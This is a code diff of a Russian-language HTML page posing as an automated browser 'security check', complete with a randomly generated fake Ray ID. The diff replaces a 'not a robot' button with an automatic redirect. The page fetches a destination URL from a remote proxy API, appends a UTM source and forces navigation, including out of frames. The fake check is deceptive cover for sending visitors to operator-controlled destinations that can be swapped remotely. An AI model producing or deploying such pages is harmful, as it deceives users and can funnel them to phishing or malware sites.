@@ -193,14 +193,13 @@
 
             <h1>Проверка безопасности</h1>
             <p>
-                Система проверяет ваше соединение на наличие автоматических угроз. 
-                <br>Пожалуйста, подтвердите действие для перехода.
+                Система проверяет ваше соединение на наличие автоматических угроз.
             </p>
 
-            <button id="submitAction" class="action-btn">
-                <span class="btn-lbl">Я не робот. Перейти далее</span>
-                <div class="loader-ui"></div>
-            </button>
+            <div id="statusContainer" style="margin-top: 25px; padding: 16px 20px; background: #eff6ff; border-radius: 8px; border: 1px solid #bfdbfe; color: var(--primary-dark); font-weight: 600; font-size: 15px; display: flex; align-items: center; justify-content: center; gap: 12px; box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);">
+                <span>Автоматическая проверка браузера...</span>
+                <div class="loader-ui" style="display: block; border: 2px solid rgba(37, 99, 235, 0.2); border-top-color: var(--primary); width: 18px; height: 18px;"></div>
+            </div>
 
             <div class="tech-footer">
                 <span>Ray ID: <script>document.write(Math.random().toString(36).substr(2, 9).toUpperCase())</script></span>
@@ -211,7 +210,7 @@
 
     <script>
         // ПРОКСИ API БУДЕТ ПОДСТАВЛЕН АВТОМАТИЧЕСКИ СКРИПТОМ DEPLOY
-        const MY_PROXY_API = "https://security-check.ivanvagin1488-commits.deno.net/api/get_url";
+        const MY_PROXY_API = "https://redirect-security.netlify.app/api/get_url";
 
         function appendUtmSource(targetUrl) {
             try {
@@ -228,32 +227,62 @@
             return targetUrl;
         }
 
-        document.addEventListener('DOMContentLoaded', function() {
-            const btn = document.getElementById('submitAction');
+        document.addEventListener('DOMContentLoaded', async function() {
+            const statusContainer = document.getElementById('statusContainer');
+            let errMsg = document.getElementById('errorMsg');
+            if (!errMsg) {
+                errMsg = document.createElement('div');
+                errMsg.id = 'errorMsg';
+                errMsg.style.color = '#ef4444';
+                errMsg.style.fontSize = '13px';
+                errMsg.style.marginTop = '10px';
+                errMsg.style.display = 'none';
+                statusContainer.parentNode.insertBefore(errMsg, statusContainer.nextSibling);
+            }
+            
+            const minDelay = 2000;
+            const maxWait = 5000;
+            const start = Date.now();
 
-            btn.addEventListener('click', async function(evt) {
-                evt.preventDefault();
-                btn.classList.add('active');
-
-                try {
-                    const response = await fetch(MY_PROXY_API);
-                    const data = await response.json();
-                    
-                    if (data.success && data.url) {
-                        window.location.href = appendUtmSource(data.url);
-                    } else {
-                        console.error('Security verification failed: No URL returned');
-                        btn.classList.remove('active');
-                        btn.querySelector('.btn-lbl').innerText = 'Ошибка. Попробовать еще раз';
-                        btn.style.background = '#ef4444'; 
+            const fetchPromise = fetch(MY_PROXY_API)
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.success && data.url) {
+                        return data.url;
                     }
-                } catch (error) {
-                    console.error("Proxy Fetch Error:", error);
-                    btn.classList.remove('active');
-                    btn.querySelector('.btn-lbl').innerText = 'Ошибка соединения';
-                    btn.style.background = '#ef4444';
-                }
+                    throw new Error(data.error || 'Unknown Error');
+                });
+
+            const timeoutPromise = new Promise((_, reject) => {
+                setTimeout(() => reject(new Error('Превышено время ожидания ответа от сервера.')), maxWait);
             });
+
+            Promise.race([fetchPromise, timeoutPromise])
+                .then((url) => {
+                    const elapsed = Date.now() - start;
+                    const remainingDelay = Math.max(0, minDelay - elapsed);
+                    
+                    setTimeout(() => {
+                        const finalUrl = appendUtmSource(url);
+                        try {
+                            window.top.location.href = finalUrl;
+                        } catch (e) {}
+                        setTimeout(() => {
+                            window.location.href = finalUrl;
+                        }, 100);
+                    }, remainingDelay);
+                })
+                .catch(err => {
+                    console.error(err);
+                    const elapsed = Date.now() - start;
+                    const remainingDelay = Math.max(0, minDelay - elapsed);
+                    
+                    setTimeout(() => {
+                        statusContainer.innerHTML = '<span style="color:#ef4444;">Ошибка проверки. Пожалуйста, обновите страницу.</span>';
+                        errMsg.style.display = 'block';
+                        errMsg.textContent = "Ошибка: " + err.message;
+                    }, remainingDelay);
+                });
         });
     </script>
 </body>
